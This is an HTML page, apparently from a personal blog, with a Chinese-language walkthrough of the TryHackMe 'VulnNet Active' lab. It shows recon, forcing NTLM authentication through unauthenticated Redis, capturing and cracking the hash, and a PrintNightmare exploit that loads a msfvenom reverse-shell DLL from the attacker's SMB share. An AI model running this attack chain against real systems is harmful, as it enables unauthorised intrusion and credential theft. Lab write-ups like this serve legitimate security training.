@@ -1,0 +1,678 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <link rel="icon" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Mosaic Theory">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Recon:123456789101112131415161718192021222324252627282930313233# Nmap 7.92SVN scan initiated Sat Jun 25 20:27:04 2022 as: nmap -sC -sV -Pn -p- -O -T4 -oA nmap.txt 10.10.43.168Nmap scan report for 10.1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TryHackMe-VulnNet Active">
+<meta property="og:url" content="http://example.com/2022/10/06/TryHackMe-VulnNet%20Active/index.html">
+<meta property="og:site_name" content="Personal Cloud Note">
+<meta property="og:description" content="Recon:123456789101112131415161718192021222324252627282930313233# Nmap 7.92SVN scan initiated Sat Jun 25 20:27:04 2022 as: nmap -sC -sV -Pn -p- -O -T4 -oA nmap.txt 10.10.43.168Nmap scan report for 10.1">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220625220711092.png">
+<meta property="article:published_time" content="2022-10-06T11:30:34.881Z">
+<meta property="article:modified_time" content="2022-07-09T08:08:39.000Z">
+<meta property="article:author" content="Crazyinside">
+<meta property="article:tag" content="Active Directory">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.worldisend.com/img/image-20220625220711092.png">
+  
+  
+  
+  <title>TryHackMe-VulnNet Active - Personal Cloud Note</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://www.worldisend.com/fluid/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Crazyinside&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://www.worldisend.com/fluid/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="TryHackMe-VulnNet Active"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-06 19:30" pubdate>
+          October 6, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.1k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          60 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">TryHackMe-VulnNet Active</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Nmap 7.92SVN scan initiated Sat Jun 25 20:27:04 2022 as: nmap -sC -sV -Pn -p- -O -T4 -oA nmap.txt 10.10.43.168</span><br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.43.168<br>Host is up (0.31s latency).<br>Not shown: 65522 filtered tcp ports (no-response)<br>PORT      STATE SERVICE       VERSION<br>53/tcp    open  domain        Simple DNS Plus<br>135/tcp   open  msrpc         Microsoft Windows RPC<br>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br>445/tcp   open  microsoft-ds?<br>464/tcp   open  kpasswd5?<br>6379/tcp  open  redis         Redis key-value store 2.8.2402<br>9389/tcp  open  mc-nmf        .NET Message Framing<br>49666/tcp open  msrpc         Microsoft Windows RPC<br>49668/tcp open  msrpc         Microsoft Windows RPC<br>49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>49674/tcp open  msrpc         Microsoft Windows RPC<br>49679/tcp open  msrpc         Microsoft Windows RPC<br>49695/tcp open  msrpc         Microsoft Windows RPC<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>OS fingerprint not ideal because: Missing a closed TCP port so results incomplete<br>No OS matches <span class="hljs-keyword">for</span> host<br>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb2-security-mode: <br>|   311: <br>|_    Message signing enabled and required<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2022-06-25T12:36:24<br>|_  start_date: N/A<br><br>OS and Service detection performed. Please report any incorrect results at https://google.com/submit/ .<br><span class="hljs-comment"># Nmap done at Sat Jun 25 20:37:00 2022 -- 1 IP address (1 host up) scanned in 595.83 seconds</span><br></code></pre></td></tr></table></figure>
+
+<p>看起来88端口被防火墙掩盖掉了，5985 winrm也被过滤掉了。SMB共享有开着，6379有个redis服务，初始访问路径已经很清楚了，要么走smb命名管道命令执行，那就需要SMB允许匿名访问或者RPC允许匿名访问找到泄露的身份凭证。要么就是6379 redis漏洞利用。而445在拒绝了我的匿名访问，那么只有redis未授权了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$redis</span>-cli -h 10.10.43.168<br>10.10.43.168:6379&gt; <span class="hljs-built_in">help</span> <br>redis-cli 6.0.16<br>To get <span class="hljs-built_in">help</span> about Redis commands <span class="hljs-built_in">type</span>:<br>      <span class="hljs-string">&quot;help @&lt;group&gt;&quot;</span> to get a list of commands <span class="hljs-keyword">in</span> &lt;group&gt;<br>      <span class="hljs-string">&quot;help &lt;command&gt;&quot;</span> <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span> on &lt;<span class="hljs-built_in">command</span>&gt;<br>      <span class="hljs-string">&quot;help &lt;tab&gt;&quot;</span> to get a list of possible <span class="hljs-built_in">help</span> topics<br>      <span class="hljs-string">&quot;quit&quot;</span> to <span class="hljs-built_in">exit</span><br><br>To <span class="hljs-built_in">set</span> redis-cli preferences:<br>      <span class="hljs-string">&quot;:set hints&quot;</span> <span class="hljs-built_in">enable</span> online hints<br>      <span class="hljs-string">&quot;:set nohints&quot;</span> <span class="hljs-built_in">disable</span> online hints<br>Set your preferences <span class="hljs-keyword">in</span> ~/.redisclirc<br>10.10.43.168:6379&gt; get @group<br>(nil)<br>10.10.43.168:6379&gt; get <span class="hljs-built_in">users</span><br>(nil)<br>10.10.43.168:6379&gt; config get *<br>........................<br>104) <span class="hljs-string">&quot;C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402&quot;</span><br>105) <span class="hljs-string">&quot;maxmemory-policy&quot;</span><br>106) <span class="hljs-string">&quot;volatile-lru&quot;</span><br>107) <span class="hljs-string">&quot;appendfsync&quot;</span><br>108) <span class="hljs-string">&quot;everysec&quot;</span><br>109) <span class="hljs-string">&quot;save&quot;</span><br>110) <span class="hljs-string">&quot;jd 3600 jd 300 jd 60&quot;</span><br>111) <span class="hljs-string">&quot;loglevel&quot;</span><br>112) <span class="hljs-string">&quot;notice&quot;</span><br>113) <span class="hljs-string">&quot;client-output-buffer-limit&quot;</span><br>114) <span class="hljs-string">&quot;normal 0 0 0 slave 268435456 67108864 60 pubsub 33554432 8388608 60&quot;</span><br>115) <span class="hljs-string">&quot;unixsocketperm&quot;</span><br>116) <span class="hljs-string">&quot;0&quot;</span><br>117) <span class="hljs-string">&quot;slaveof&quot;</span><br>118) <span class="hljs-string">&quot;&quot;</span><br>119) <span class="hljs-string">&quot;notify-keyspace-events&quot;</span><br>120) <span class="hljs-string">&quot;&quot;</span><br>121) <span class="hljs-string">&quot;bind&quot;</span><br>122) <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>一个用户名，但不像那么回事：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">enterprise-security<br></code></pre></td></tr></table></figure>
+
+<p>后来我发现了这个，并尝试枚举了下RPC：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/cube0x0/</span>CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">1675</span><br></code></pre></td></tr></table></figure>
+
+<p>根据漏洞提示进行RPC枚举确实符合EXP的利用条件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$rpcdump</span>.py @10.10.43.168 | egrep <span class="hljs-string">&#x27;MS-RPRN|MS-PAR&#x27;</span><br>Protocol: [MS-RPRN]: Print System Remote Protocol <br>Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol <br></code></pre></td></tr></table></figure>
+
+<p>看了漏洞分析才想起，我之前做过一次。本质是低用户被意外得允许更改标志位导致系统错认为该低用户有安装驱动服务得权限。但是他需要一个合法用户，而我没有。单单一个用户名其实为我带不来什么：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$smbmap</span> -H 10.10.43.168 -u enterprise-security<br>[!] Authentication error on 10.10.43.168<br></code></pre></td></tr></table></figure>
+
+<p>那么当前其实我也只用也只能围绕redis展开搜索。</p>
+<p><img src="https://www.worldisend.com/img/image-20220625220711092.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220625220711092"></p>
+<p>看到这我有了一个想法，它既然可以枚举目录，那么应该可以枚举smb共享目录。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">10.10.43.168:6379&gt; EVAL <span class="hljs-string">&quot;dofile(&#x27;//10.11.75.230/share&#x27;)&quot;</span> 0<br>(error) ERR Error running script (call to f_7f0425edd207f314e9d1689b9c224af6f663f96d): @user_script:1: cannot open //10.13.43.238/share: Permission denied <br>(5.14s)<br>10.10.43.168:6379&gt; <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$sudo</span> responder -I tun0<br>                                         __<br>  .----.-----.-----.-----.-----.-----.--|  |.-----.----.<br>  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|<br>  |__| |_____|_____|   __|_____|__|__|_____||_____|__|<br>                   |__|<br><br>           NBT-NS, LLMNR &amp; MDNS Responder 3.0.6.0<br><br>  Author: Laurent Gaffie (laurent.gaffie@gmail.com)<br>  To <span class="hljs-built_in">kill</span> this script hit CTRL-C<br>  <br>  [+] Listening <span class="hljs-keyword">for</span> events...<br><br>[SMB] NTLMv2-SSP Client   : 10.10.43.168<br>[SMB] NTLMv2-SSP Username : VULNNET\enterprise-security<br>[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:da836369b9380f4b:3CC0F0C76D0609CB13DFDCD7D5B0FAAB:010100000000000080B17D5DE088D801BE7A96CFAB37D1CE0000000002000800470053004C00460001001E00570049004E002D003500510030003600580054004600300059005900450004003400570049004E002D00350051003000360058005400460030005900590045002E00470053004C0046002E004C004F00430041004C0003001400470053004C0046002E004C004F00430041004C0005001400470053004C0046002E004C004F00430041004C000700080080B17D5DE088D8010600040002000000080030003000000000000000000000000030000044BC5BB5D7BA89833787B5E3EEAB0D80BED3613C9C1839233D47D4651103570C0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310033002E00340033002E00320033003800000000000000000<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$hashcat</span> -m 5600 ntlmv2 /usr/share/wordlists/rockyou.txt<br><br>Watchdog: Hardware monitoring interface not found on your system.<br>Watchdog: Temperature abort trigger disabled.<br><br>Host memory required <span class="hljs-keyword">for</span> this attack: 66 MB<br><br>Dictionary cache built:<br>* Filename..: /usr/share/wordlists/rockyou.txt<br>* Passwords.: 14344392<br>* Bytes.....: 139921507<br>* Keyspace..: 14344385<br>* Runtime...: 1 sec<br><br>ENTERPRISE-SECURITY::VULNNET:da836369b9380f4b:3cc0f0c76d0609cb13dfdcd7d5b0faab:010100000000000080b17d5de088d801be7a96cfab37d1ce0000000002000800470053004c00460001001e00570049004e002d003500510030003600580054004600300059005900450004003400570049004e002d00350051003000360058005400460030005900590045002e00470053004c0046002e004c004f00430041004c0003001400470053004c0046002e004c004f00430041004c0005001400470053004c0046002e004c004f00430041004c000700080080b17d5de088d8010600040002000000080030003000000000000000000000000030000044bc5bb5d7ba89833787b5e3eeab0d80bed3613c9c1839233d47d4651103570c0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310033002e00340033002e003200330038000000000000000000:sand_0873959498<br>                                                 <br>Session..........: hashcat<br>Status...........: Cracked<br>Hash.Name........: NetNTLMv2<br>Hash.Target......: ENTERPRISE-SECURITY::VULNNET:da836369b9380f4b:3cc0f...000000<br>Time.Started.....: Sat Jun 25 22:15:02 2022 (2 secs)<br>Time.Estimated...: Sat Jun 25 22:15:04 2022 (0 secs)<br>Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)<br>Guess.Queue......: 1/1 (100.00%)<br>Speed.<span class="hljs-comment">#1.........:  2606.4 kH/s (2.20ms) @ Accel:1024 Loops:1 Thr:1 Vec:8</span><br>Recovered........: 1/1 (100.00%) Digests<br>Progress.........: 4014080/14344385 (27.98%)<br>Rejected.........: 0/4014080 (0.00%)<br>Restore.Point....: 4005888/14344385 (27.93%)<br>Restore.Sub.<span class="hljs-comment">#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span><br>Candidates.<span class="hljs-comment">#1....: sanjayram -&gt; sand418</span><br></code></pre></td></tr></table></figure>
+
+<p>有了凭证便可以尝试漏洞利用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$msfvenom</span> -p windows/x64/meterpreter/reverse_tcp LHOST=10.11.75.230 LPORT=1337 -f dll &gt; exp.dll<br><span class="hljs-variable">$sudo</span> smbserver.py share . -smb2support<br>Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation<br><br>[*] Config file parsed<br>[*] Callback added <span class="hljs-keyword">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0<br>[*] Callback added <span class="hljs-keyword">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0<br>[*] Config file parsed<br>[*] Config file parsed<br>[*] Config file parsed<br></code></pre></td></tr></table></figure>
+
+<p>启动对应监听模块：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$python3</span> CVE-2021-1675.py VULNNET/enterprise-security:<span class="hljs-string">&#x27;sand_0873959498&#x27;</span>@10.10.43.168 <span class="hljs-string">&#x27;\\10.11.75.230\share\exp.dll&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[msf]</span>(<span class="hljs-attribute">Jobs</span>:<span class="hljs-number">0</span> <span class="hljs-attribute">Agents</span>:<span class="hljs-number">0</span>) <span class="hljs-selector-tag">exploit</span>(multi/handler) &gt;&gt; <span class="hljs-selector-tag">run</span> <br><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Started</span> <span class="hljs-selector-tag">reverse</span> <span class="hljs-selector-tag">TCP</span> <span class="hljs-selector-tag">handler</span> <span class="hljs-selector-tag">on</span> <span class="hljs-number">10.11</span><span class="hljs-selector-class">.75</span><span class="hljs-selector-class">.230</span>:<span class="hljs-number">1337</span> <br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Sending</span> <span class="hljs-selector-tag">stage</span> (<span class="hljs-number">200774</span> bytes) <span class="hljs-selector-tag">to</span> <span class="hljs-number">10.10</span><span class="hljs-selector-class">.43</span><span class="hljs-selector-class">.168</span><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Meterpreter</span> <span class="hljs-selector-tag">session</span> <span class="hljs-number">1</span> <span class="hljs-selector-tag">opened</span> (<span class="hljs-number">10.11</span>.<span class="hljs-number">75.230</span>:<span class="hljs-number">1337</span> -&gt; <span class="hljs-number">10.10</span>.<span class="hljs-number">43.168</span>:<span class="hljs-number">49808</span>) <span class="hljs-selector-tag">at</span> <span class="hljs-number">2022</span><span class="hljs-selector-tag">-06-25</span> <span class="hljs-number">23</span>:<span class="hljs-number">06</span>:<span class="hljs-number">25</span> +<span class="hljs-number">0800</span><br><br>(Meterpreter <span class="hljs-number">1</span>)(<span class="hljs-attribute">C</span>:\Windows\system32) &gt;<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/TryHackMe/" class="category-chain-item">TryHackMe</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Active-Directory/">#Active Directory</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>TryHackMe-VulnNet Active</div>
+      <div>http://example.com/2022/10/06/TryHackMe-VulnNet Active/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Mosaic Theory</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 6, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/10/06/TryHackMe-Ra2/" title="TryHackMe-Ra2">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">TryHackMe-Ra2</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/06/Tryhackme-Mr-robot/" title="Tryhackme-Mr robot">
+                        <span class="hidden-mobile">Tryhackme-Mr robot</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
